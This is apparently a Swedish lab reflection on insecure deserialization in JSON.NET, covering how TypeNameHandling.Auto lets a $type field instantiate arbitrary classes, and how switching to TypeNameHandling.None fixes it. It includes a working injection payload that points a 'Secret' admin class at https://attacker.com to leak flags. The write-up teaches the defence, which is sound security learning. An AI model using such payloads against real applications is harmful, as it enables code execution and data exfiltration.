# A08: Insecure Deserialization - Reflektion

## Sårbarhet: TypeNameHandling.Auto I JSON.NET

**Problem:** JSON.NET konfigurerad med `TypeNameHandling.Auto` tillåter `$type`-injektioner i JSON-payload, vilket möjliggör instantiering av godtyckliga klasser.

**Angreppsväg:**
```json
{
  "content": "Updated note",
  "properties": {
    "hack": {
      "$type": "Notes.Api.Admin.Secret, Notes.Api",
      "name": "Teodor",
      "url": "https://attacker.com",
      "client": {}
    }
  }
}
```

**Konsekvens:**
- ❌ Godtycklig kodexekvering via klassinstansiering
- ❌ Utläckning av känslig data (flaggor) via HTTP-requests
- ❌ Remote code execution genom setters
- ❌ Information disclosure från Server-objekt

**Fix:**
```csharp
// FÖRE (sårbar):
options.SerializerSettings.TypeNameHandling = TypeNameHandling.Auto;

// EFTER (säker):
options.SerializerSettings.TypeNameHandling = TypeNameHandling.None;
```

**Verifiering - Attacken Fungerar Inte Längre:**
```
FÖRE: PATCH /notes/{id} med $type-injektionen
      → Secret-klassen instantieras
      → "Access granted" skrivs till console (SÅRBAR)

EFTER: PATCH /notes/{id} med $type-injektionen
       → $type-fältet ignoreras
       → Bara vanlig string-deserialisering
       → Ingen klassinstansiering (SÄKER)
```

**Förebyggande:**
- ✅ ALDRIG TypeNameHandling.Auto eller .Objects
- ✅ Använd TypeNameHandling.None som default
- ✅ Om typen måste hanteras - använd SerializationBinder för whitelist
- ✅ Validera all inkommande data före deserialisering
- ✅ Använd [JsonObject] och [JsonProperty] för explicit kontroll

---

## Vad Jag Lärde Mig

**#1 - Deserialisering = Potentiell RCE**
Deserialisering av användardata är extremt riskfyllt. Det är nästan som att köra användarens kod direkt.

**#2 - Setters Kan Ha Sidoeffekter**
En innocent-utseende setter kan göra farlig saker - HTTP-requests, filoperationer, etc.

**#3 - Metadata I JSON Är Farligt**
`$type`, `__type`, osv är kraftfulla men extremt farliga. Aldrig tilltro användarens typinformation.
